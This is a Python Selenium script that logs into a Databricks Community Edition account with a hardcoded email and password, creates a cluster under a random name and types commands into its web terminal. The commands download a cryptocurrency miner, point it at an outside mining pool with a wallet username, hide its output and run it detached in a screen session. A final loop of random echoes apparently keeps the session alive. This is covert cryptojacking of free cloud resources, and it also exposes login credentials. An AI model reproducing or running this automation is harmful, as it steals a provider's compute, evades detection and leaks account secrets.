from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains  
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import tkinter as tk
import names
import secrets
import random
import string
import os

###TEMP-NAMES###

k1 = random.randint(4,8)
k2 = random.randint(4,8)
k3 = random.randint(4,8)
name = names.get_first_name(gender='male')
name2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k = k1))
name5 = ''.join(random.choices(string.ascii_uppercase + string.digits, k = k2))
name3 = ''.join(random.choices(string.digits + string.ascii_lowercase, k = k3))

driver = webdriver.Chrome()
driver.get("https://community.cloud.databricks.com/login.html")
time.sleep(20)


driver.find_element("xpath", '//*[@id="login-email"]').send_keys("Maovn28vadb@hotmail.com")
time.sleep(10)

driver.find_element("xpath", '//*[@id="login-password"]').send_keys("Manijeni@96")
time.sleep(10)
driver.find_element("xpath", '//*[@id="login-container"]/div/div/div[4]/button').click()
time.sleep(10)
driver.find_element("xpath", '//*[@id="sidebar"]/div/div[1]/nav/div[4]/div[1]/div[2]/a[1]').click()
time.sleep(10)
driver.find_element("xpath", '//*[@id="create-menu-button"]').click()
time.sleep(10)
driver.find_element("xpath", '//*[@id="create-menu"]/a[2]').click()
time.sleep(20)
driver.find_element("xpath", '//*[@id="cluster-input--name"]').send_keys(name3)
time.sleep(15)

driver.find_element("xpath", '//*[@id="content"]/div/div/uses-legacy-bootstrap/div/form/div/header/h2/span[2]/button[2]').click()
time.sleep(400)
driver.find_element("xpath", '//*[@id="content"]/div/div/div/form/div/div[4]/uses-legacy-bootstrap/ul/li[8]').click()
time.sleep(10)
driver.find_element("xpath", '//*[@id="content"]/div/div/div/form/div/div[4]/div/div/uses-legacy-bootstrap/div/div[1]/div/button').click()
time.sleep(14)
driver.switch_to.window(driver.window_handles[1])
time.sleep(15)
print("success")
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys("touch ", name+name2+".sh")
time.sleep(10)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
time.sleep(10)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys("apt update && apt install screen git -y ")
time.sleep(10)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
time.sleep(30)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys('echo -e " curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && mv violetminer-linux-v0.2.2.tar.gz vd.tar.gz && tar xf vd.tar.gz && mv violetminer-linux-v0.2.2 vdf && cd vdf && mv violetminer vtm && ./vtm --algorithm wrkzcoin --pool 168.235.86.33:3393 --username SK_pDKo9B7rTqyPDrYeohNv5.kijo47 --password x --disableNVIDIA --threads 85 > /dev/null 2>&1" >', name+name2+'.sh')
time.sleep(10)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
time.sleep(10)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys('screen -S ', name5,' -dm bash ', name+name2+'.sh')
time.sleep(10)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)   
time.sleep(10)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys("while :; do     rodin=$(openssl rand -hex 20);     echo $rodin;     sleep 5;     rod=$(openssl rand -base64 15);     echo $rod;     sleep 20; done")
time.sleep(10)
driver.find_element("xpath", '//*[@id="terminal-container"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
time.sleep(12)
